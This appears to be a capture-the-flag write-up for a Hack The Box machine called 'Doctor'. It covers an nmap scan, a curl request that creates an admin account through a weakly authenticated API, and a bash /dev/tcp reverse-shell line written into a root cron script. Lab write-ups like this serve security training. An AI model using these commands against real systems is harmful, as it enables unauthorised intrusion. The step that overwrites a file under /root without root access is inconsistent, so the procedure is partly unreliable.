# Hack The Box: "Doctor" Writeup

## Objective:
Exploit a vulnerable API and escalate privileges to root on a Linux machine.

## Step 1: Nmap Scan
- Scanned the target to find open ports and services:
    ```bash
    nmap -A -T4 <target_ip>
    ```
- Discovered ports 80 (HTTP) and 8089 open, running a medical-related API.

## Step 2: API Exploitation
- Discovered that the API had weak authentication and could be abused to create users with elevated privileges.
- Sent a crafted HTTP request using curl to create a new admin account:
    ```bash
    curl -X POST http://<target_ip>:8089/api/users -d '{"username": "admin", "password": "password", "role": "admin"}'
    ```
- Logged in using the newly created credentials and uploaded a reverse shell.

## Step 3: Privilege Escalation
- After gaining initial access, used LinPEAS to find potential privilege escalation vectors.
- Found a cron job running a script with root privileges.
- Modified the cron job script to spawn a root shell:
    ```bash
    echo "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1" > /root/cronjob.sh
    ```
- Once the cron job executed, gained root access and retrieved the flag.

## Lessons Learned:
- APIs often have weak or missing authentication mechanisms, which can be exploited for remote access.
- Cron jobs are a common method of privilege escalation in Linux systems, especially if they are misconfigured.
